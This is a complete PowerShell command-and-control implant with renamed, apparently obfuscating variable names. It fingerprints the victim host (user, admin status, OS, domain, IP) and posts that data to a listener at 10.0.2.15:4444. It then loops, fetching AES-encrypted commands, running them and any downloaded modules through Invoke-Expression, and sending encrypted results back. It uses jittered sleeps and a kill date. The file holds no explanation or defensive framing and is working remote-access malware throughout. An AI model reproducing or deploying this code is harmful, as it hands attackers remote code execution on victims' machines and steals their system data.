$exchange=1
function CAM ($key,$block){

$commit = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"
$commit.Mode = [System.Security.Cryptography.CipherMode]::CBC
$commit.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$commit.BlockSize = 128
$commit.KeySize = 256
if ($block)
{
if ($block.getType().Name -eq "String")
{$commit.IV = [System.Convert]::FromBase64String($block)}
else
{$commit.IV = $block}
}
if ($key)
{
if ($key.getType().Name -eq "String")
{$commit.Key = [System.Convert]::FromBase64String($key)}
else
{$commit.Key = $key}
}
$commit}


function ENC ($key,$student,$rows=0){
if ($rows -eq 0){
$pname = [System.Text.Encoding]::UTF8.GetBytes($student)}
else{
$pname=$student}
$commit = CAM $key
$u21 = $commit.CreateEncryptor()
$checkemail = $u21.TransformFinalBlock($pname, 0, $pname.Length)
[byte[]] $classification = $commit.IV + $checkemail
[System.Convert]::ToBase64String($classification)
}


function DEC ($key,$FormbuilderTestModel,$rows=0){
$pname = [System.Convert]::FromBase64String($FormbuilderTestModel)
$block = $pname[0..15]
$commit = CAM $key $block
$d = $commit.CreateDecryptor()
$u = $d.TransformFinalBlock($pname, 16, $pname.Length - 16)
if ($rows -eq 0){
[System.Text.Encoding]::UTF8.GetString($u)
}
else{
return $u}
}



function load($top)
      {

            $linkname = enc -key $key -student $top

            $ParentID = new-object net.WebClient
            $ParentID.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
            $ParentID.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")

            try{
              $folders = @{charge=$rn;schema=$linkname}
                $limit=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri http://10.0.2.15:4444/uddilistener -Method POST -Body $folders
		$limit=$limit.Content
            }
            catch{
                $folders = "charge=$rn&schema=$linkname"
                $ParentID = new-object net.WebClient
                $ParentID.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
                $ParentID.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
                $limit=$ParentID.UploadString("http://10.0.2.15:4444/uddilistener",$folders)
                }


            $modulecontent=dec -key $key -FormbuilderTestModel $limit


      return $modulecontent
      }

$int = $env:COMPUTERNAME;
if ((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){ $nick="*"}
$ctid = $env:USERNAME;
$ctid ="$nick$ctid"
$foo6 = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$PayerID = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($foo6)";
$complete = (Get-WmiObject Win32_ComputerSystem).Domain;
$TracksTotal=(gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
$pw = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
$rn="$pw-img.jpeg"

$frontpage="schema=$PayerID**$TracksTotal**$foo6**$int**$complete**$ctid**$pid&$pw=$rn"
$ParentID = new-object net.WebClient
      $ParentID.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $ParentID.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $key=$ParentID.UploadString("http://10.0.2.15:4444/wsil",$frontpage)
$done = 'silentlyContinue';

$ParentID = New-Object system.Net.WebClient;
$windows=$rn
while($true){
$dictionary=[int](Get-Date -UFormat "%s")%97
$phpMyAdmin=Get-Random -Minimum 50 -Maximum 250 -SetSeed $dictionary
$hour=-join ((65..90)*500 + (97..122)*500 | Get-Random -Count $phpMyAdmin | % {[char]$_});


try{
    $folders = @{charge=$rn;token=$hour}
$FormbuilderTestModel=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri http://10.0.2.15:4444/disco -Method POST -Body $folders
$FormbuilderTestModel=$FormbuilderTestModel.Content
}
 catch{
$folders="charge=$rn&token=$hour"
        $ParentID = new-object net.WebClient
      $ParentID.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $ParentID.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $FormbuilderTestModel=$ParentID.UploadString("http://10.0.2.15:4444/disco",$folders)
        }



if($FormbuilderTestModel -eq "REGISTER"){
$ParentID = new-object net.WebClient
      $ParentID.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $ParentID.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $key=$ParentID.UploadString("http://10.0.2.15:4444/wsil",$frontpage)
$done = 'silentlyContinue';
continue
}
$reg=echo $FormbuilderTestModel | select-string -Pattern "\-\*\-\*\-\*"
if($reg)
#$FormbuilderTestModel -eq "-")
{
$dictionary=[int](Get-Date -UFormat "%s")
$nombre=[int]$exchange/2+1
$passphrase=[int]$exchange+1
$exchange=Get-Random -Minimum $nombre -Maximum $passphrase -SetSeed $dictionary
sleep $exchange
$smiley = (Get-Date -Format "dd/MM/yyyy")
$smiley = [datetime]::ParseExact($smiley,"dd/MM/yyyy",$null)
$mID = [datetime]::ParseExact("11/04/2022","dd/MM/yyyy",$null)
if ($mID -lt $smiley) {kill $pid}
}
else{
$eventID=dec -key $key -FormbuilderTestModel $FormbuilderTestModel



if($eventID.split(" ")[0] -eq "load"){
$checkemail=$eventID.split(" ")[1]
$top=load -top $checkemail
try{
$options=Invoke-Expression ($top) -ErrorVariable display | Out-String
        }
        catch{
        $options = $Error[0] | Out-String;
        }
        if ($options.Length -eq 0){
        $options="$options$display"
        }


}
else{
try{
$options=Invoke-Expression ($eventID) -ErrorVariable display | Out-String
        }
        catch{
        $options = $Error[0] | Out-String;
        }
        if ($options.Length -eq 0){
        $options="$options$display"
        }}

  if ($options.Length -eq 0){
$options="$options$display"
}

$adminpass=enc -key $key -student $options






 try{
      $folders = @{charge=$rn;schema=$adminpass}
$warned=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri http://10.0.2.15:4444/publishing -Method POST -Body $folders
}
 catch{
 $folders = "charge=$rn&schema=$adminpass"
        $ParentID = new-object net.WebClient
      $ParentID.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $ParentID.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $warned=$ParentID.UploadString("http://10.0.2.15:4444/publishing","POST",$folders)
        }

$warned=" "
$options=" "
}
}
